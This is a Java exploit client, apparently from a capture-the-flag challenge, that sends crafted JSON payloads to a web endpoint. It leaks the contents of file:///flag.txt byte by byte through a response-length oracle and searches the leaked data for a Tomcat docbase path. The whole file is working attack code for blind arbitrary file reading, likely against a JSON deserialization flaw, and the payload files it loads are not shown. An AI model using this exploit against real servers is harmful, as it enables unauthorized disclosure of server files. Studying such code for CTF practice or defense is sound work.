package com.huarui;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class coitext {
    // 直接定义目标服务器 URL
    private static final String url = "http://127.0.0.1:8080/json"; // 替换为目标服务器的实际 URL
    private static final int TIMEOUT = 5000;
    private static String fileToRead = "file:///flag.txt";

    public static void main(String[] args) {
        step1();
        String docbase = step2();
        if (docbase == null) {
        } else {
            System.out.println("docbase: " + docbase);
        }
    }

    private static void step1() {
        try {
            String step1Payload = readFile("payload/step1.json");
            sendJson(step1Payload);
        } catch (IOException e) {
            System.out.println("加载 step1.json 时出错: " + e.getMessage());
        }
    }

    private static String step2() {
        try {
            String step2Payload = readFile("payload/step2.json");
            step2Payload = step2Payload.replace("${file}", fileToRead);

            int falseLen = sendJson(step2Payload.replace("${data}", "[1]")).length();
            boolean flag = true;
            List<Integer> result = new ArrayList<>();
            String data;
            String docbase = "";

            System.out.println("读取文件中...");
            while (flag) {
                data = resultToString(result);
                System.out.println(data);

                for (int i = 0; i < 256; i++) {
                    List<Integer> tmp = new ArrayList<>(result);
                    tmp.add(i);
                    String payload = step2Payload.replace("${data}", tmp.toString());
                    String response = sendJson(payload);

                    if (response.length() != falseLen) {
                        result.add(i);
                        if (i == 0xA) {
                            System.out.println("[+] 检查中...");
                            data = resultToString(result);
                            Matcher matcher = Pattern.compile("tomcat-docbase\\.\\d+\\.\\d+").matcher(data);
                            if (matcher.find()) {
                                docbase = matcher.group();
                                System.out.println("[+] 找到 docbase: " + docbase);
                                flag = false;
                            } else {
                                System.out.println("[-] 未找到 docbase");
                            }
                        }
                        break;
                    }

                    if (i == 255) {
                        flag = false;
                    }
                }
            }

            System.out.println("--------------------------------");
            System.out.println("[+] 结果: \n" + resultToString(result));
            System.out.println("--------------------------------");

            return docbase.isEmpty() ? null : docbase;
        } catch (IOException e) {
            System.out.println("加载 step2.json 时出错: " + e.getMessage());
            return null;
        }
    }

    private static String sendJson(String payload) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setConnectTimeout(TIMEOUT);
            connection.setReadTimeout(TIMEOUT);
            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(("json=" + payload).getBytes(StandardCharsets.UTF_8));
            }

            StringBuilder response = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
            }
            return response.toString();
        } catch (IOException e) {
            System.out.println("发送请求失败: " + e.getMessage());
            return "";
        }
    }

    private static String readFile(String filePath) throws IOException {
        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath, StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
        }
        return content.toString();
    }

    private static String resultToString(List<Integer> result) {
        StringBuilder data = new StringBuilder();
        for (int i : result) {
            data.append((char) i);
        }
        return data.toString();
    }
}
